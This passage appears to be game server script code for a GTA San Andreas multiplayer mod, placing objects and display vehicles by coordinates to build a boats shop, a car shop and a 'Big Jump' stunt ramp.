	CreateViewOnlyVehicle(468, -2305.6279, -54.3502, 37.3203, 180.0000, -1, -1);
	CreateViewOnlyVehicle(468, -2305.8667, -58.1830, 37.9668, 0.0000, -1, -1);
	// Boats Shop
	CreateSObject(11495, -780.15814, 643.04260, 0.19470,   0.00000, 0.00000, 180.00000);
	CreateSObject(11495, -778.42871, 591.71545, 0.80380,   0.00000, 0.00000, 0.00000);
	CreateSObject(19378, -773.98962, 621.62061, 4.34000,   0.00000, 90.00000, 0.00000);
	CreateSObject(14416, -779.27710, 628.27319, 1.21897,   0.00000, 0.00000, 180.00000);
	CreateSObject(19378, -784.47162, 621.61841, 4.34000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -784.47058, 611.98022, 4.34000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -784.49292, 626.35681, -0.40000,   90.00000, 0.00000, 90.00000);
	CreateSObject(19378, -784.44690, 607.24420, -0.40000,   90.00000, 0.00000, 90.00000);
	CreateSObject(19378, -789.64398, 621.61249, -0.83000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19378, -768.81970, 621.62598, -0.83000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19378, -774.00201, 626.35681, -0.40000,   90.00000, 0.00000, 90.00000);
	CreateSObject(19378, -773.94836, 607.23962, -0.40000,   90.00000, 0.00000, 90.00000);
	CreateSObject(19378, -768.77472, 611.99536, -0.83000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19378, -789.64404, 611.98883, -0.83000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19378, -768.81989, 612.39404, 9.22670,   90.00000, 0.00000, 0.00000);
	CreateSObject(19378, -789.62836, 612.40326, 9.22670,   90.00000, 0.00000, 0.00000);
	CreateSObject(19378, -789.62469, 621.17975, 9.22670,   90.00000, 0.00000, 0.00000);
	CreateSObject(19378, -768.82397, 621.19696, 9.22670,   90.00000, 0.00000, 0.00000);
	CreateSObject(19378, -773.67780, 626.34998, 8.78000,   0.00000, 0.00000, 90.00000);
	CreateSObject(14416, -779.27710, 605.30188, 1.21900,   0.00000, 0.00000, 0.00000);
	CreateSObject(19378, -784.80957, 626.34998, 8.78000,   0.00000, 0.00000, 90.00000);
	CreateSObject(3851, -779.95038, 626.38123, 12.90000,   0.00000, 0.00000, 90.00000);
	CreateSObject(3851, -787.67523, 607.15662, 8.29303,   90.00000, 0.00000, 90.00000);
	CreateSObject(3851, -770.83368, 607.15662, 8.29300,   90.00000, 0.00000, 90.00000);
	CreateSObject(3851, -774.82391, 607.15662, 8.29300,   90.00000, 0.00000, 90.00000);
	CreateSObject(1491, -780.00104, 626.31537, 4.41000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -783.67761, 607.15662, 8.29300,   90.00000, 0.00000, 90.00000);
	CreateSObject(3851, -779.95038, 626.38123, 8.90000,   0.00000, 0.00000, 90.00000);
	CreateSObject(18981, -779.28540, 616.41937, 14.41000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19378, -773.97943, 611.98181, 4.34000,   0.00000, 90.00000, 0.00000);
	CreateSObject(11495, -778.38373, 643.04211, 0.19470,   0.00000, 0.00000, 0.00000);
	CreateSObject(11495, -811.51294, 589.93042, 0.79990,   0.00000, 0.00000, 180.00000);
	CreateSObject(11495, -757.49188, 579.83197, 0.80380,   0.00000, 0.00000, -90.00000);
	CreateSObject(11495, -780.19781, 591.71283, 0.80380,   0.00000, 0.00000, 180.00000);
	CreateSObject(11495, -747.39941, 589.92737, 0.79990,   0.00000, 0.00000, 0.00000);
	CreateSObject(11495, -801.46454, 579.83246, 0.80380,   0.00000, 0.00000, -90.00000);
	CreateSObject(11495, -769.27472, 591.66376, 0.79990,   0.00000, 0.00000, 0.00000);
	CreateSObject(11495, -779.47949, 579.83582, 0.80380,   0.00000, 0.00000, -90.00000);
	CreateSObject(11495, -789.60858, 591.69958, 0.79990,   0.00000, 0.00000, 180.00000);
	CreateSObject(1461, -780.66724, 626.75159, 4.95450,   0.00000, 0.00000, 180.00000);
	CreateSObject(1461, -777.83514, 626.72119, 4.95450,   0.00000, 0.00000, 180.00000);
	CreateSObject(1231, -777.86353, 653.53210, 3.12500,   0.00000, 0.00000, 0.00000);
	CreateSObject(1231, -780.79742, 653.65326, 3.12500,   0.00000, 0.00000, 0.00000);
	CreateSObject(1461, -777.90961, 580.83221, 1.73147,   0.00000, 0.00000, 180.00000);
	CreateSObject(2435, -788.45587, 620.80499, 4.42000,   0.00000, 0.00000, 180.00000);
	CreateSObject(2435, -786.40961, 614.20679, 4.42000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2435, -786.40961, 616.94830, 4.42000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2435, -786.40961, 617.86218, 4.42000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2435, -786.40961, 616.03662, 4.42000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2435, -786.40961, 618.78668, 4.42000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2435, -786.40961, 615.12292, 4.42000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2434, -786.57227, 613.08215, 4.42000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2435, -786.40961, 619.71167, 4.42000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2435, -788.39618, 613.08337, 4.42000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2252, -786.59442, 620.64288, 5.75000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2434, -786.40710, 620.63971, 4.42000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2435, -787.53998, 620.80499, 4.42000,   0.00000, 0.00000, 180.00000);
	CreateSObject(2435, -787.49152, 613.08350, 4.42000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1703, -769.59863, 616.95612, 4.42000,   0.00000, 0.00000, -90.00000);
	CreateSObject(1703, -776.42029, 625.48413, 4.42000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1714, -787.59039, 618.21783, 4.42630,   0.00000, 0.00000, 131.91293);
	CreateSObject(1714, -787.79785, 615.55646, 4.42630,   0.00000, 0.00000, 70.00000);
	CreateSObject(2252, -786.56427, 613.30328, 5.75000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1744, -789.71063, 618.36652, 6.61505,   0.00000, 0.00000, 90.00000);
	CreateSObject(1744, -789.70367, 614.40918, 6.61500,   0.00000, 0.00000, 90.00000);
	CreateSObject(1744, -789.71057, 618.36652, 8.69540,   0.00000, 0.00000, 90.00000);
	CreateSObject(1744, -789.70374, 614.40924, 8.69538,   0.00000, 0.00000, 90.00000);
	CreateSObject(1814, -772.03015, 623.24396, 4.42332,   0.00000, 0.00000, 0.00000);
	CreateSObject(1808, -773.36438, 626.08539, 4.42398,   0.00000, 0.00000, 0.00000);
	CreateSObject(2186, -789.10406, 618.79950, 4.40000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2190, -786.32800, 615.28741, 5.47370,   0.00000, 0.00000, 270.00000);
	CreateSObject(2190, -786.30994, 618.68170, 5.47370,   0.00000, 0.00000, 270.00000);
	CreateSObject(19174, -789.54303, 624.22162, 9.89720,   0.00000, 0.00000, 90.00000);
	CreateSObject(19172, -789.54962, 616.87128, 9.89720,   0.00000, 0.00000, 90.00000);
	CreateSObject(19175, -789.53491, 609.36102, 9.89720,   0.00000, 0.00000, 90.00000);
	CreateSObject(2200, -788.46118, 626.10065, 4.42376,   0.00000, 0.00000, 0.00000);
	CreateSObject(2200, -789.39819, 623.89685, 4.42380,   0.00000, 0.00000, 90.00000);
	CreateSObject(1703, -772.43127, 625.46698, 4.42000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1703, -769.60193, 624.64264, 4.42000,   0.00000, 0.00000, -90.00000);
	CreateSObject(1776, -769.42828, 617.91681, 5.44640,   0.00000, 0.00000, -90.00000);
	CreateSObject(1703, -769.62323, 620.88702, 4.42000,   0.00000, 0.00000, -90.00000);
	CreateSObject(1775, -769.40961, 621.78113, 5.44640,   0.00000, 0.00000, -90.00000);
	CreateSObject(1461, -780.73035, 580.82770, 1.73147,   0.00000, 0.00000, 180.00000);
	CreateSObject(19173, -768.91669, 624.35608, 6.48236,   0.00000, 0.00000, 270.00000);
	CreateSObject(19170, -771.39001, 626.27496, 6.48240,   270.00000, 0.00000, 180.00000);
	CreateSObject(3515, -779.30280, 648.70807, -0.47000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -779.26410, 636.00128, -0.47000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -779.27637, 642.35431, -0.47000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1514, -786.51874, 617.09723, 5.72000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2484, -789.39978, 618.72467, 7.79000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2484, -789.41290, 614.97552, 7.79000,   0.00000, 0.00000, 90.00000);
	CreateSObject(2484, -789.41290, 614.97552, 9.87000,   0.00000, 0.00000, 270.00000);
	CreateSObject(2484, -789.39978, 618.72467, 9.87000,   0.00000, 0.00000, 90.00000);
	CreateSObject(3461, -772.59998, 624.53540, 8.55000,   80.00000, 0.00000, 0.00000);
	CreateSObject(3461, -786.29999, 624.83313, 8.55000,   80.00000, 0.00000, 0.00000);
	CreateSObject(3461, -783.29999, 624.80328, 8.55000,   80.00000, 0.00000, 0.00000);
	CreateSObject(3461, -775.59998, 624.61823, 8.55001,   80.00000, 0.00000, 0.00000);
	CreateSObject(3461, -770.56091, 613.14423, 8.33520,   85.00000, 0.00000, -90.00000);
	CreateSObject(3461, -770.49268, 619.74078, 8.33525,   85.00000, 0.00000, -90.00000);
	CreateViewOnlyVehicle(493, -785.2299, 588.5970, -0.3234, 0.0000, -1, -1);
	CreateViewOnlyVehicle(484, -758.4501, 591.0959, 0.9930, 0.0000, -1, -1);
	CreateViewOnlyVehicle(454, -801.6169, 590.2451, 0.1059, 0.0000, -1, -1);
	CreateViewOnlyVehicle(452, -773.8733, 588.6815, 0.9325, 0.0000, -1, -1);
	// Car Shop
	CreateSObject(3851, -2251.97217, 524.04462, 36.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2251.97217, 524.04462, 39.98000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2251.97217, 547.79681, 39.98000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2251.97217, 547.79681, 36.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2251.97217, 547.79681, 43.97000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2251.96094, 540.15845, 29.00000,   90.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2251.96191, 540.15643, 40.31000,   90.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2251.97192, 531.70148, 29.00000,   90.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2251.97192, 531.70227, 40.31000,   90.00000, 0.00000, 0.00000);
	CreateSObject(18981, -2259.77759, 528.68549, 46.39445,   0.00000, 90.00000, 0.00000);
	CreateSObject(18981, -2259.78589, 543.41205, 46.39445,   0.00000, 90.00000, 0.00000);
	CreateSObject(18981, -2272.98853, 528.68903, 46.39445,   0.00000, 90.00000, 0.00000);
	CreateSObject(18981, -2272.97852, 543.40796, 46.39445,   0.00000, 90.00000, 0.00000);
	CreateSObject(3851, -2251.97217, 524.04462, 43.97000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19377, -2275.91797, 548.61267, 39.26099,   0.00000, 0.00000, 0.00000);
	CreateSObject(19377, -2275.91919, 538.99768, 39.26099,   0.00000, 0.00000, 0.00000);
	CreateSObject(19377, -2275.92603, 523.19055, 39.26099,   0.00000, 0.00000, 0.00000);
	CreateSObject(19377, -2275.92334, 529.36572, 39.26099,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2275.93579, 547.76343, 43.97000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2275.93579, 535.87482, 43.97000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3851, -2275.93579, 524.04889, 43.97000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19379, -2257.22266, 523.21796, 34.20190,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2257.22925, 532.85278, 34.20190,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2257.21899, 542.47180, 34.20190,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2257.23242, 548.64478, 34.20000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2267.72900, 548.62671, 34.20190,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2267.72388, 539.04077, 34.20190,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2267.71387, 529.42145, 34.20190,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2267.68188, 523.22418, 34.20000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2270.72192, 523.19177, 34.20100,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2278.21558, 532.81842, 34.20190,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2278.19775, 542.42926, 34.20190,   0.00000, 90.00000, 0.00000);
	CreateSObject(19379, -2270.58862, 548.62860, 34.20100,   0.00000, 90.00000, 0.00000);
	CreateSObject(18981, -2263.53052, 552.99957, 34.00756,   0.00000, 0.00000, 90.00000);
	CreateSObject(18981, -2263.53125, 518.82037, 34.00760,   0.00000, 0.00000, 90.00000);
	CreateSObject(19458, -2269.88257, 550.87109, 40.18681,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -2258.28198, 521.05920, 43.30277,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -2258.28198, 521.05920, 36.85650,   0.00000, 90.00000, 90.00000);
	CreateSObject(1726, -2256.70630, 550.72021, 34.28030,   0.00000, 0.00000, 0.00000);
	CreateSObject(1726, -2253.17773, 549.19562, 34.28030,   0.00000, 0.00000, -90.00000);
	CreateSObject(1726, -2258.21411, 547.10022, 34.28030,   0.00000, 0.00000, 90.00000);
	CreateSObject(1714, -2273.39600, 535.80701, 34.28230,   0.00000, 0.00000, 101.61359);
	CreateSObject(1789, -2260.79956, 522.32690, 34.84242,   0.00000, 0.00000, 55.57520);
	CreateSObject(1808, -2274.63721, 552.31042, 34.27965,   0.00000, 0.00000, 0.00000);
	CreateSObject(2024, -2256.25220, 547.78540, 34.08171,   0.00000, 0.00000, 0.00000);
	CreateSObject(2186, -2275.34155, 534.04022, 34.27760,   0.00000, 0.00000, 90.00000);
	CreateSObject(2184, -2273.37085, 532.61566, 34.28630,   0.00000, 0.00000, 46.94120);
	CreateSObject(2184, -2271.59131, 534.93451, 34.28630,   0.00000, 0.00000, 90.00000);
	CreateSObject(2184, -2276.23120, 532.11249, 34.28630,   0.00000, 0.00000, 4.11604);
	CreateSObject(2184, -2271.89209, 537.85059, 34.28630,   0.00000, 0.00000, 132.89510);
	CreateSObject(2184, -2274.09814, 539.75830, 34.28630,   0.00000, 0.00000, 175.96187);
	CreateSObject(2190, -2271.95776, 536.40820, 35.05690,   0.00000, 0.00000, 287.76447);
	CreateSObject(2239, -2252.39526, 546.54840, 34.27000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2164, -2275.80322, 535.87854, 34.28610,   0.00000, 0.00000, 90.00000);
	CreateSObject(2163, -2275.80933, 537.65460, 34.28610,   0.00000, 0.00000, 90.00000);
	CreateSObject(2245, -2275.58960, 538.63147, 35.46000,   0.00000, 0.00000, 60.62176);
	CreateSObject(1726, -2275.21826, 548.60962, 34.28030,   0.00000, 0.00000, 90.00000);
	CreateSObject(1726, -2275.21509, 545.84802, 34.28030,   0.00000, 0.00000, 90.00000);
	CreateSObject(1726, -2273.10449, 551.99213, 34.28030,   0.00000, 0.00000, 0.00000);
	CreateSObject(1778, -2260.87549, 523.55688, 34.29000,   0.00000, 0.00000, 55.57520);
	CreateSObject(2240, -2275.22656, 530.74994, 34.84000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2240, -2253.54370, 550.66321, 34.84000,   0.00000, 0.00000, -0.12000);
	CreateSObject(19446, -2256.68115, 535.93372, 34.20600,   0.00000, 90.00000, 90.00000);
	CreateSObject(19446, -2266.31299, 535.92938, 34.20600,   0.00000, 90.00000, 90.00000);
	CreateSObject(19446, -2275.92236, 535.93298, 34.20600,   0.00000, 90.00000, 90.00000);
	CreateSObject(1726, -2253.39941, 528.24664, 34.28030,   0.00000, 0.00000, 270.00000);
	CreateSObject(1726, -2253.41162, 525.63971, 34.28030,   0.00000, 0.00000, 270.00000);
	CreateSObject(1727, -2256.53149, 525.46564, 34.28030,   0.00000, 0.00000, 90.00000);
	CreateSObject(2024, -2254.44653, 525.46667, 34.08170,   0.00000, 0.00000, 90.00000);
	CreateSObject(2024, -2272.15430, 548.80792, 34.08170,   0.00000, 0.00000, 90.00000);
	CreateSObject(2024, -2272.15552, 546.84747, 34.08170,   0.00000, 0.00000, 90.00000);
	CreateSObject(2240, -2270.10083, 551.95538, 34.84000,   0.00000, 0.00000, -0.12000);
	CreateSObject(2245, -2272.61621, 549.28424, 34.91000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2245, -2272.56494, 547.34241, 34.91000,   0.00000, 0.00000, 600.00000);
	CreateSObject(19458, -2274.08179, 530.04059, 42.06158,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -2274.12915, 535.91785, 38.90542,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -2274.12329, 541.80402, 42.06158,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -2258.48853, 550.82843, 43.30277,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -2269.61743, 521.05920, 40.18681,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -2258.51978, 550.86035, 36.85650,   0.00000, 90.00000, 90.00000);
	CreateSObject(19462, -2263.21655, 526.91541, 34.38100,   0.00000, 90.00000, 90.00000);
	CreateSObject(19462, -2263.66748, 544.86700, 34.38100,   0.00000, 90.00000, 90.00000);
	CreateSObject(14826, -2249.23022, 523.58362, 34.80000,   0.00000, 0.00000, 270.11539);
	CreateSObject(1074, -2275.72363, 528.01251, 36.48490,   0.00000, 0.00000, 0.00000);
	CreateSObject(1077, -2275.68896, 525.94733, 36.48490,   0.00000, 0.00000, 0.00000);
	CreateSObject(1079, -2275.66357, 523.96259, 36.48490,   0.00000, 0.00000, 0.00000);
	CreateSObject(1085, -2275.67407, 521.95392, 37.93720,   0.00000, 0.00000, 0.00000);
	CreateSObject(10281, -2275.09131, 548.17328, 36.54995,   0.00000, -15.00000, 90.00000);
	CreateSObject(1075, -2275.67407, 521.95392, 36.48490,   0.00000, 0.00000, 0.00000);
	CreateSObject(1083, -2275.66357, 523.96259, 37.93720,   0.00000, 0.00000, 0.00000);
	CreateSObject(1082, -2275.68896, 525.94733, 37.93720,   0.00000, 0.00000, 0.00000);
	CreateSObject(1080, -2275.72363, 528.01251, 37.93720,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2258.41016, 526.02411, 34.74010,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2258.41064, 527.94360, 34.74010,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2259.34717, 528.89917, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2261.27222, 528.89917, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2263.19580, 528.89600, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2265.12085, 528.89600, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2267.04883, 528.89600, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2268.06250, 527.94360, 34.74010,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2268.05713, 526.02411, 34.74010,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2267.07690, 525.06598, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2265.15601, 525.06598, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2263.22607, 525.06598, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2261.30200, 525.06598, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2259.38501, 525.06598, 34.74010,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2268.51343, 543.88580, 34.46550,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2268.51343, 545.80878, 34.46550,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2267.52539, 546.77228, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2265.60547, 546.77228, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2263.67944, 546.77228, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2261.75439, 546.77228, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2259.83252, 546.77228, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2267.52930, 542.92432, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2265.61133, 542.92432, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2263.69141, 542.92432, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2261.77148, 542.92432, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2259.85352, 542.92432, 34.46550,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2258.91431, 543.88580, 34.46550,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2258.89819, 545.81482, 34.46550,   0.00000, 0.00000, 0.00000);
	CreateSObject(640, -2251.59009, 540.81140, 34.73470,   0.00000, 0.00000, 0.00000);
	CreateSObject(640, -2251.60889, 530.97418, 34.73470,   0.00000, 0.00000, 0.00000);
	CreateSObject(2773, -2250.84277, 537.88788, 34.56410,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2248.92090, 537.88788, 34.56410,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2247.00879, 537.88788, 34.56410,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2250.79370, 533.96167, 34.56410,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2248.87329, 533.95972, 34.56410,   0.00000, 0.00000, 90.00000);
	CreateSObject(2773, -2246.95142, 533.95972, 34.56410,   0.00000, 0.00000, 90.00000);
	CreateViewOnlyVehicle(451, -2262.8835, 526.7815, 34.9770, -90.0000, -1, -1);
	CreateViewOnlyVehicle(411, -2263.8303, 544.8285, 35.1368, -90.0000, -1, -1);
	CreateViewOnlyVehicle(567, -2274.5295, 529.7538, 42.9547, 0.0000, -1, -1);
	CreateViewOnlyVehicle(603, -2258.3564, 550.9666, 37.7274, -90.0000, -1, -1);
	CreateViewOnlyVehicle(602, -2273.9541, 541.8251, 42.8251, 0.0000, -1, -1);
	CreateViewOnlyVehicle(541, -2274.1499, 535.8467, 39.6651, 0.0000, -1, -1);
	CreateViewOnlyVehicle(506, -2258.1982, 520.9698, 37.6493, 90.0000, -1, -1);
	CreateViewOnlyVehicle(495, -2258.4141, 520.3956, 44.5551, 90.0000, -1, -1);
	CreateViewOnlyVehicle(434, -2268.9907, 550.1928, 41.3199, -90.0000, -1, -1);
	CreateViewOnlyVehicle(477, -2269.5457, 521.3666, 40.9106, 90.0000, -1, -1);
	CreateViewOnlyVehicle(545, -2258.3362, 550.5317, 44.2197, -90.0000, -1, -1);
	// The Big Jump
	CreateSObject(18847, 1865.34375, 81.31517, 1400.58813,   0.00000, 0.00000, 90.00000);
	CreateSObject(18847, 1864.78052, -154.37164, 1346.14355,   0.00000, -26.00000, 90.00000);
	CreateSObject(18847, 1864.87109, -369.91028, 1241.06897,   0.00000, -26.00000, 90.00000);
	CreateSObject(18847, 1864.80774, -585.13135, 1136.07263,   0.00000, -26.00000, 90.00000);
	CreateSObject(18847, 1865.47449, -786.80084, 1015.25024,   0.00000, -34.00000, 90.00000);
	CreateSObject(18847, 1865.49292, -984.87982, 881.61230,   0.00000, -34.00000, 90.00000);
	CreateSObject(18847, 1865.36108, -1183.15210, 747.73120,   0.00000, -34.00000, 90.00000);
	CreateSObject(18847, 1865.21228, -1381.42139, 613.90851,   0.00000, -34.00000, 90.00000);
	CreateSObject(18847, 1865.23132, -1579.45557, 480.26450,   0.00000, -34.00000, 90.00000);
	CreateSObject(18847, 1865.25916, -1777.31531, 346.77570,   0.00000, -34.00000, 90.00000);
	CreateSObject(18847, 1865.38367, 81.31740, 1462.75122,   0.00000, 180.00000, 90.00000);
	CreateSObject(18847, 1865.34448, 37.03573, 1400.58813,   0.00000, 270.00000, 90.08440);
	CreateSObject(18780, 1862.86035, -1894.24756, 271.42249,   0.00000, 16.00000, 270.00000);
	CreateSObject(18780, 1853.09534, -1894.90381, 271.41641,   0.00000, 16.00000, 270.00000);
	CreateSObject(18780, 1843.19287, -1896.15186, 271.41641,   0.00000, 16.00000, 270.00000);
	CreateSObject(18780, 1872.61108, -1894.42200, 271.41641,   0.00000, 16.00000, 270.00000);
	CreateSObject(18780, 1891.94458, -1893.34448, 271.88751,   4.00000, 16.00000, 270.00000);
	CreateSObject(18780, 1882.38428, -1894.38159, 271.41641,   0.00000, 16.00000, 270.00000);
	CreateSObject(18780, 1833.38953, -1896.20117, 271.41641,   0.00000, 16.00000, 270.00000);
	CreateSObject(3437, 1861.95557, -22.92141, 1380.74915,   0.00000, 90.00000, 90.00000);
	CreateSObject(3437, 1862.81262, -28.82840, 1380.74915,   0.00000, 90.00000, 81.00000);
	CreateSObject(3437, 1860.91724, -28.75366, 1380.74915,   0.00000, 90.00000, 99.00000);
	CreateSObject(3437, 1866.55493, -28.96813, 1380.74915,   0.00000, 90.00000, 99.00000);
	CreateSObject(3437, 1868.48999, -29.00787, 1380.74915,   0.00000, 90.00000, 81.00000);
	CreateSObject(3437, 1867.46912, -23.02132, 1380.74915,   0.00000, 90.00000, 90.00000);
	CreateSObject(3437, 1871.61658, -28.94466, 1380.74915,   0.00000, 90.00000, 99.00000);
	CreateSObject(3437, 1873.57104, -29.00477, 1380.74915,   0.00000, 90.00000, 81.00000);
	CreateSObject(3437, 1872.64282, -23.07523, 1380.74915,   0.00000, 90.00000, 90.00000);
	CreateSObject(1655, 1862.69739, -780.89612, 996.80725,   0.00000, 0.00000, 0.00000);
	CreateSObject(897, 1882.27698, -844.95905, 955.23303,   0.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1853.73792, -909.25897, 910.52783,   30.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1868.08716, -925.05450, 899.93488,   30.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1846.90356, -946.54047, 886.26215,   30.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1867.52075, -958.79071, 877.09082,   30.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1863.11487, -982.66840, 860.86566,   30.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1838.27600, -991.63177, 857.92419,   30.00000, 0.00000, 0.00000);
	CreateSObject(16776, 1864.64246, -1185.72107, 725.36176,   0.00000, 0.00000, 180.00000);
	CreateSObject(1225, 1887.21851, -986.51465, 859.70819,   30.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1861.66187, -1440.60840, 552.77930,   0.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1847.78687, -1440.70337, 552.77930,   0.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1878.37512, -1440.55371, 552.77930,   0.00000, 0.00000, 0.00000);
	CreateSObject(7392, 1910.67065, -831.49377, 990.99109,   -66.00000, 0.00000, 87.00000);
	CreateSObject(7073, 1828.41772, -1115.48376, 797.72522,   0.00000, 0.00000, 90.00000);
	CreateSObject(2780, 1897.11450, -1376.46252, 598.97699,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, 1830.76477, -1379.28552, 598.97699,   0.00000, 0.00000, 0.00000);
	CreateSObject(1655, 1915.08154, -1008.19458, 864.97559,   -16.00000, -44.00000, -40.00000);
	CreateSObject(1655, 1819.49512, -1302.24780, 660.89325,   -24.00000, 36.00000, 30.90771);
	CreateSObject(1655, 1887.86743, -1272.58142, 665.82239,   0.00000, -12.00000, 0.00000);
	CreateSObject(1225, 1873.16406, -1008.59833, 843.41302,   30.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1887.99951, -1029.32263, 831.13818,   30.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1855.33032, -1032.76038, 827.26160,   30.00000, 0.00000, 0.00000);
	CreateSObject(1225, 1850.63464, -965.78613, 872.37695,   30.00000, 0.00000, 0.00000);
	CreateSObject(16776, 1899.37634, -1137.65833, 762.46021,   -14.00000, 24.00000, 180.00000);
	CreateSObject(16776, 1833.68457, -1138.86902, 762.46021,   -14.00000, -24.00000, 180.00000);
	CreateSObject(897, 1878.94641, -1555.90369, 476.81165,   0.00000, 0.00000, 0.00000);
	CreateSObject(1655, 1870.14758, -1346.54126, 613.67072,   -16.00000, 0.00000, 359.00000);
	CreateSObject(2780, 1891.87219, -1375.73840, 598.19586,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, 1884.96899, -1375.08020, 596.47009,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, 1888.00269, -1380.21643, 593.77338,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, 1894.36987, -1381.59399, 594.59564,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, 1834.12122, -1378.38037, 597.48224,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, 1838.79797, -1377.43689, 596.97217,   0.00000, 0.00000, 0.00000);
